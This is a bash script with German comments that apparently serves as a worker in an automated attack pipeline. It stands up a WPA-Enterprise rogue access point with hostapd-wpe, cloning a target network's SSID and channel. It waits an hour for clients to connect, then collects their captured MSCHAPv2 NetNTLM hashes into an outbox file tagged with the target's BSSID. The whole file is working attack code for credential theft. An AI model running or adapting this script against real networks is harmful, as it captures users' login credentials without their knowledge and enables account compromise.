#!/bin/bash
# === automgt.sh - WPA-Enterprise Rogue AP ===

# Diese Variablen werden vom Master-Skript übergeben
TARGET_CHANNEL=$1
TARGET_BSSID=$2
TARGET_SSID=$3

# Kali-Standard laut offizieller hostapd-wpe Doku
sudo airmon-ng check kill
sudo airmon-ng stop wlan0mon 2>/dev/null 
sleep 2

sudo rmmod brcmfmac && sudo modprobe brcmfmac
sleep 8

sudo ip link set wlan0 up
sleep 4

# Schnittstelle auf den normalen Modus setzen
INTERFACE="wlan0"
DURATION=3600

# === PFADE IM VERSCHLÜSSELTEN TRESOR ===
BASE_DIR="/home/atlantis/ordner"
CONF_FILE="$BASE_DIR/wpe.conf"
LOG_FILE="$BASE_DIR/wpe.log"
RESULT_FILE="$BASE_DIR/outbox/psk/$(date +%s).txt"
OUTBOX="$BASE_DIR/outbox/psk"
ARCHIVE="$BASE_DIR/archive"
CERTS_DIR="$BASE_DIR/certs"
EAP_USER_FILE="$BASE_DIR/hostapd-wpe.eap_user"

# ------------------------------------------------------------------------------
# 2. hostapd-wpe Konfiguration generieren
# ------------------------------------------------------------------------------
echo "[BASH-MGT] Erzeuge Zertifikate und Konfiguration für '$TARGET_SSID'..."

cat <<EOF > "$CONF_FILE"
interface=$INTERFACE
driver=nl80211
ssid=$TARGET_SSID
channel=$TARGET_CHANNEL
hw_mode=g
auth_algs=3
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
rsn_pairwise=CCMP
ieee8021x=1
eap_server=1
eap_user_file=$EAP_USER_FILE
ca_cert=$CERTS_DIR/ca.pem
server_cert=$CERTS_DIR/server.pem
private_key=$CERTS_DIR/server.key
private_key_passwd=whatever
wpe_logfile=$LOG_FILE
logger_stdout=-1
logger_stdout_level=2
EOF

# ------------------------------------------------------------------------------
# 3. Rogue-AP starten und lauschen
# ------------------------------------------------------------------------------
echo "[BASH-MGT] Starte Rogue-AP im Hintergrund..."

trap 'sudo kill -9 $WPE_PID 2>/dev/null' EXIT
sudo hostapd-wpe "$CONF_FILE" > "$BASE_DIR/hostapd-wpe-stdout.log" 2>&1 &
WPE_PID=$!

echo "[BASH-MGT] Warte $DURATION Sekunden auf unvorsichtige Clients..."

for (( i=0; i<$DURATION; i++ )); do
    if ! kill -0 $WPE_PID 2>/dev/null; then
        echo "[BASH-MGT] WARNUNG: hostapd-wpe ist unerwartet abgestürzt!"
        exit 1
    fi
    sleep 1
done

# ------------------------------------------------------------------------------
# 4. Aufräumen und Extrahieren
# ------------------------------------------------------------------------------
echo "[BASH-MGT] Beende Rogue-AP..."
sudo kill $WPE_PID 2>/dev/null
wait $WPE_PID 2>/dev/null
trap - EXIT 
sudo systemctl start NetworkManager 2>/dev/null

echo "[BASH-MGT] Analysiere gesammelte Daten..."

if grep -q "jtr NETNTLM:" "$LOG_FILE"; then
    echo "[BASH-MGT] ERFOLG! NetNTLM-Hashes (MSCHAPv2) gefunden."
    
    echo "target_ssid=$TARGET_SSID" > "$RESULT_FILE"
    echo "target_bssid=$TARGET_BSSID" >> "$RESULT_FILE"
    echo "channel=$TARGET_CHANNEL" >> "$RESULT_FILE"
    echo "---" >> "$RESULT_FILE"
    
    grep "jtr NETNTLM:" "$LOG_FILE" >> "$RESULT_FILE"
    
    mv "$RESULT_FILE" "$OUTBOX/"
    TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
    mv "$LOG_FILE" "$ARCHIVE/wpe_log_${TIMESTAMP}_${TARGET_BSSID}.txt"
    
    echo "[BASH-MGT] Worker erfolgreich beendet."
    exit 0
else
    echo "[BASH-MGT] Kein Hash gefunden."
    rm -f "$LOG_FILE"
    exit 1
fi
